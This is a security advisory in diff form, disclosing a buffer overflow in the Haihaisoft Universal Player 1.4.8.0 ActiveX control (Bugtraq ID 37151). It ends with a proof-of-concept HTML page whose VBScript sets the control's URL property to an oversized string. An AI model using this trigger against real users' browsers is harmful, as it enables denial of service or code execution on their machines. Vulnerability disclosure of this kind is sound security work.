@@ -1,0 +1,25 @@
+Haihaisoft Universal Player is prone to an unspecified buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied data.
+
+Successful exploits allow remote attackers to execute arbitrary code in the context of the application using the ActiveX control (typically Internet Explorer). Failed exploit attempts will likely result in denial-of-service conditions.
+
+Haihaisoft Universal Player 1.4.8.0 is vulnerable; other versions may also be affected.
+
+Bugtraq ID: 37151
+Class: Boundary Condition Error
+CVE:
+Remote: Yes
+Local: No
+Published: Nov 30 2009 12:00AM
+Updated: Dec 01 2009 01:15AM
+Credit: shinnai
+Vulnerable: Haihaisoft Haihaisoft Universal Player 1.4.8 0
+
+<object classid='clsid:1A01FF01-EA62-4702-B837-1E07158145FA' id='test'></object>
+
+<script language='vbscript'>
+
+buff = String(3540, "A")
+
+test.URL = "http://" + buff
+
+</script>
